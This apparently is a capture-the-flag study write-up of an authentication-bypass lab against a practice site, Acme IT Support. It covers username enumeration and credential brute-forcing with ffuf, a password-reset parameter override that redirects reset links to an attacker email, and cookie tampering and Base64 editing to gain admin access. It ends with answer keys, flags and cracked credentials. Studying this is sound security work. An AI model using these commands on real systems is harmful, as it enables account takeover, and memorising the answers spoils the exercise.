# **Username Enumeration Using FFUF**

## **Overview**

Username enumeration is a technique used during security testing to identify valid usernames on a web application. This happens when a website reveals different error messages depending on whether a username exists or not. Attackers can abuse these responses to collect legitimate usernames that may later be used for password attacks, phishing, or privilege escalation attempts.

In this exercise, the target was the signup page of the Acme IT Support website. When attempting to register with an already existing username such as admin, the website returned the message:

“An account with this username already exists.”

This response confirms that the username is valid. By automating requests with the ffuf tool and a wordlist, multiple usernames can be tested quickly to identify existing accounts.

## **Key Takeaways**

* Username enumeration occurs when applications expose different responses for valid and invalid usernames.  
* Error messages can unintentionally leak sensitive information.  
* Tools like ffuf can automate the process of testing usernames.  
* Wordlists help attackers or penetration testers identify commonly used usernames.  
* Enumeration is often an early phase in penetration testing and can lead to further attacks such as brute forcing.

## **FFUF Command Breakdown**

ffuf \-w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \\  
\-X POST \\  
\-d "username=FUZZ\&email=x\&password=x\&cpassword=x" \\  
\-H "Content-Type: application/x-www-form-urlencoded" \\  
\-u http://MACHINE\_IP/customers/signup \\  
\-mr "username already exists"

### **Explanation of Parameters**

* \-w  
   Specifies the wordlist containing usernames to test.  
* \-X POST  
   Defines the HTTP request method as POST.  
* \-d  
   Sends form data to the target application.  
* FUZZ  
   Placeholder used by ffuf to insert each username from the wordlist.  
* \-H  
   Adds HTTP headers to the request.  
* \-u  
   Specifies the target URL.  
* \-mr  
   Filters responses containing the phrase:  
   "username already exists"

## **Important Concepts**

* Enumeration vulnerabilities often exist because developers provide overly descriptive error messages.  
* Secure applications should use generic responses such as:

   “Registration failed”  
   instead of revealing whether a username exists.

* ffuf is a fast web fuzzing tool commonly used in penetration testing.  
* The SecLists collection contains many useful wordlists for security assessments.

## **Additional Information**

### **Common Uses of Username Enumeration**

* Password spraying attacks  
* Credential stuffing  
* Social engineering  
* Target profiling

### **Defensive Measures**

Organizations can reduce username enumeration risks by:

* Using generic authentication error messages  
* Implementing rate limiting  
* Monitoring repeated signup or login attempts  
* Enabling CAPTCHA protections  
* Logging suspicious enumeration behavior

## **Questions and Answers**

What is the username starting with si\*\*\* ?  
 **simon**

What is the username starting with st\*\*\* ?  
 **steve**

What is the username starting with ro\*\*\*\* ?  
 **robert**

# **Brute Force Attack Using FFUF**

## **Overview**

A brute force attack is a method used to gain unauthorized access to an account by automatically trying many username and password combinations until the correct credentials are found. In penetration testing, this technique helps identify weak passwords and poor authentication security practices.

In this task, the previously discovered usernames stored in valid\_usernames.txt were combined with a common password wordlist to test login credentials against the Acme IT Support login page. The ffuf tool automated the process by sending repeated POST requests with different username and password combinations.

## **Key Takeaways**

* Brute force attacks rely on weak or commonly used passwords.  
* Username enumeration significantly improves the success rate of brute force attacks.  
* ffuf supports multiple wordlists for credential testing.  
* Authentication systems should implement protections against repeated login attempts.  
* HTTP response codes can help identify successful logins.

## **FFUF Brute Force Command**

ffuf \-w valid\_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \\  
\-X POST \\  
\-d "username=W1\&password=W2" \\  
\-H "Content-Type: application/x-www-form-urlencoded" \\  
\-u http://MACHINE\_IP/customers/login \\  
\-fc 200

## **Explanation of Parameters**

* \-w  
   Loads multiple wordlists:  
  * W1 → usernames  
  * W2 → passwords  
* W1 and W2  
   Custom fuzzing keywords used to insert values from each wordlist.  
* \-X POST  
   Sends POST requests to the login form.  
* \-d  
   Specifies the login form data.  
* \-H  
   Sets the content type header.  
* \-u  
   Defines the target login URL.  
* \-fc 200  
   Filters out responses with status code 200.  
   A different response code may indicate a successful login.

## **Important Concepts**

### **Why Brute Force Works**

Brute force attacks succeed because many users still use:

* Weak passwords  
* Default credentials  
* Common passwords reused across services

### **Common Password Examples**

* password  
* 123456  
* qwerty  
* letmein

### **Security Risks**

Successful brute force attacks may lead to:

* Unauthorized account access  
* Data theft  
* Privilege escalation  
* System compromise

## **Defensive Measures**

Organizations can reduce brute force risks by implementing:

* Strong password policies  
* Multi-factor authentication (MFA)  
* Account lockout mechanisms  
* CAPTCHA protection  
* Login attempt monitoring  
* Rate limiting

## **Additional Information**

The SecLists password collection used in this exercise contains commonly leaked and frequently used passwords gathered from real-world data breaches. Security professionals use these lists to test password strength during authorized assessments.

## **Questions and Answers**

What is the valid username and password (format: username/password)?  
 **steve/thunder**

# **Authentication Logic Flaws**

## **Overview**

A logic flaw is a vulnerability caused by improper application behavior or flawed programming logic. Instead of attacking the system through traditional exploits like SQL injection or buffer overflows, attackers abuse the intended workflow of the application to bypass authentication, manipulate processes, or gain unauthorized access.

In this scenario, the Acme IT Support website contains a password reset vulnerability caused by insecure handling of user input through the PHP $\_REQUEST variable. The flaw allows an attacker to redirect a password reset email to their own account by manipulating POST parameters.

## **Key Takeaways**

* Logic flaws occur when developers fail to properly validate or secure application workflows.  
* Authentication systems are common targets for logic-based attacks.  
* The PHP $\_REQUEST variable combines GET and POST data, which can lead to dangerous behavior if not handled carefully.  
* Attackers can manipulate parameters to redirect sensitive information such as password reset links.  
* Secure applications should strictly separate and validate user input sources.

## **Logic Flaw Example**

The application checks whether a user is accessing an admin page:

if( url.substr(0,6) \=== '/admin') {  
   \# Code to check user is an admin  
} else {  
   \# View Page  
}

### **Vulnerability Explanation**

The comparison uses \===, which requires an exact match including capitalization. Because of this, a user visiting:

/adMin

bypasses the admin authentication check entirely because the condition only matches lowercase /admin.

This demonstrates how small programming mistakes can create major security vulnerabilities.

## **Password Reset Logic Flaw**

### **Step 1 – Normal Password Reset Request**

curl 'http://MACHINE\_IP/customers/reset?email=robert%40acmeitsupport.thm' \\  
\-H 'Content-Type: application/x-www-form-urlencoded' \\  
\-d 'username=robert'

This request behaves normally and sends a password reset email to Robert’s registered email address.

---

### **Step 2 – Exploiting the Vulnerability**

curl 'http://MACHINE\_IP/customers/reset?email=robert%40acmeitsupport.thm' \\  
\-H 'Content-Type: application/x-www-form-urlencoded' \\  
\-d 'username=robert\&email=attacker@hacker.com'

The vulnerability exists because:

* The account lookup uses the email from the GET request.  
* The password reset email delivery uses data from $\_REQUEST.  
* PHP prioritizes POST parameters over GET parameters when duplicate keys exist.

As a result, the reset link is delivered to the attacker-controlled email address instead of Robert’s legitimate email.

## **Important Concepts**

### **What is $\_REQUEST?**

In PHP, $\_REQUEST is a superglobal array containing:

* GET data  
* POST data  
* COOKIE data

If duplicate parameter names exist, POST values may override GET values depending on server configuration.

### **Why This is Dangerous**

This flaw can lead to:

* Account takeover  
* Unauthorized password resets  
* Privilege escalation  
* Sensitive data exposure

## **Additional Information**

### **Common Logic Flaw Vulnerabilities**

* Password reset bypasses  
* Authentication bypasses  
* Shopping cart manipulation  
* Privilege escalation  
* Workflow abuse

### **Defensive Measures**

Developers should:

* Avoid using $\_REQUEST for sensitive functionality  
* Validate parameters independently  
* Separate GET and POST handling  
* Use secure password reset tokens  
* Implement strict server-side validation

## **Questions and Answers**

What is the flag from Robert's support ticket?  
 **THM{AUTH\_BYPASS\_COMPLETE}**

# **Cookie Tampering, Hashing, and Encoding**

## **Overview**

Cookies are small pieces of data stored in a user’s browser that help websites maintain sessions, authentication states, and user preferences. Improperly secured cookies can introduce serious authentication vulnerabilities such as privilege escalation, session hijacking, or unauthorized account access.

This exercise demonstrates three important concepts:

* Plain text cookie manipulation  
* Hash identification and cracking  
* Base64 encoding and decoding

Understanding how cookies work is essential in web application security because attackers often inspect and modify them to bypass authentication controls.

## **Key Takeaways**

* Cookies should never store sensitive information in plain text.  
* Client-side data should always be validated server-side.  
* Hashes are one-way transformations used for verification.  
* Encoding is reversible and should not be treated as encryption.  
* Base64 is commonly used to store readable data in cookies.

## **Plain Text Cookie Tampering**

The application uses the following cookies:

Set-Cookie: logged\_in=true  
Set-Cookie: admin=false

Because the values are readable and modifiable, an attacker can manually change them.

### **Example Requests**

#### **Not Logged In**

curl http://MACHINE\_IP/cookie-test

Response:

Not Logged In  
---

#### **Logged In as User**

curl \-H "Cookie: logged\_in=true; admin=false" http://MACHINE\_IP/cookie-test

Response:

Logged In As A User  
---

#### **Logged In as Admin**

curl \-H "Cookie: logged\_in=true; admin=true" http://MACHINE\_IP/cookie-test

Response:

Logged In As An Admin

This demonstrates how trusting client-side cookie values can lead to privilege escalation vulnerabilities.

## **Hashing**

Hashing converts data into a fixed-length irreversible value. The same input always produces the same hash output.

### **Common Hashing Algorithms**

| Algorithm | Example Output |
| ----- | ----- |
| MD5 | c4ca4238a0b923820dcc509a6f75849b |
| SHA1 | 356a192b7913b04c54574d18c28d46e6395428ab |
| SHA-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
| SHA-512 | Long 128-character hash |

### **Important Facts**

* Hashes are not reversible.  
* Databases like CrackStation contain billions of known hashes.  
* Weak hashes such as MD5 are vulnerable to rainbow table attacks.

## **Encoding**

Encoding transforms data into another format for safe transmission and storage.

Unlike hashing:

* Encoding is reversible.  
* It is not designed for security.

### **Base64 Example**

Encoded Cookie:

eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==

Decoded Value:

{"id":1,"admin":false}

If modified and re-encoded:

{"id":1,"admin":true}

the user may gain administrative access if the server trusts the cookie contents.

## **Additional Information**

### **Common Risks of Insecure Cookies**

* Session hijacking  
* Privilege escalation  
* Authentication bypass  
* Information disclosure

### **Secure Cookie Practices**

Developers should:

* Use signed or encrypted cookies  
* Enable HttpOnly and Secure flags  
* Validate permissions server-side  
* Avoid storing sensitive data directly in cookies

## **Questions and Answers**

What is the flag from changing the plain text cookie values?  
 **THM{COOKIE\_TAMPERING}**

What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?  
 **463729**

What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?  
 **THM{BASE64\_ENCODING}**

Encode the following value using base64 {"id":1,"admin":true}

eyJpZCI6MSwiYWRtaW4iOnRydWV9  
